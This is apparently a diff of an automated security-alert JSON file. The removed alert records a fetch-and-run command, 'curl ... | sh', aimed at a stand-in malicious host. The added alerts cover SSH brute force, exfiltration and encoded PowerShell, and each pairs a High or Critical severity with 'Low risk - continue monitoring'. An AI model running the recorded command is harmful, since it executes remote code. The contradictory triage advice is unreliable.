@@ -1,17 +1,57 @@
 {
-  "generated_at": "2025-10-17T07:58:47.842821+00:00",
-  "count": 1,
+  "generated_at": "2025-10-17T07:59:25.784964",
+  "total_alerts": 3,
   "alerts": [
     {
-      "id": "alert-57445",
-      "timestamp": "2025-10-17T07:58:47.842808+00:00",
-      "summary": "MEDIUM confidence: Suspicious command observed from 104.21.23.45",
-      "confidence": "medium",
-      "evidence": {
-        "process": "cmd.exe",
-        "command": "curl http://malicious.example/payload.sh | sh",
-        "source_ip": "104.21.23.45"
-      }
+      "id": "ALERT-20251017-001",
+      "timestamp": "2025-10-17T07:59:25.784926",
+      "title": "Multiple Failed SSH Login Attempts",
+      "description": "Detected 114 failed SSH authentication attempts from 45.142.212.61",
+      "severity": "High",
+      "mitre_technique": "T1110.001 - Brute Force: Password Guessing",
+      "source_ip": "45.142.212.61",
+      "ip_reputation": {
+        "abuse_score": 0,
+        "country": "Unknown",
+        "threat_level": "Low",
+        "is_whitelisted": false,
+        "total_reports": 0
+      },
+      "recommended_action": "Low risk - continue monitoring"
+    },
+    {
+      "id": "ALERT-20251017-002",
+      "timestamp": "2025-10-17T07:59:25.784945",
+      "title": "Potential Data Exfiltration",
+      "description": "Large data transfer (1065MB) to external IP 103.109.247.10",
+      "severity": "High",
+      "mitre_technique": "T1041 - Exfiltration Over C2 Channel",
+      "source_ip": "103.109.247.10",
+      "ip_reputation": {
+        "abuse_score": 0,
+        "country": "Unknown",
+        "threat_level": "Low",
+        "is_whitelisted": false,
+        "total_reports": 0
+      },
+      "recommended_action": "Low risk - continue monitoring"
+    },
+    {
+      "id": "ALERT-20251017-003",
+      "timestamp": "2025-10-17T07:59:25.784959",
+      "title": "Suspicious PowerShell Execution",
+      "description": "Encoded PowerShell command executed with network connection to 192.168.1.100",
+      "severity": "Critical",
+      "mitre_technique": "T1059.001 - PowerShell",
+      "source_ip": "192.168.1.100",
+      "ip_reputation": {
+        "abuse_score": 0,
+        "country": "Unknown",
+        "threat_level": "Low",
+        "is_whitelisted": false,
+        "total_reports": 0
+      },
+      "recommended_action": "Low risk - continue monitoring"
     }
   ]
 }
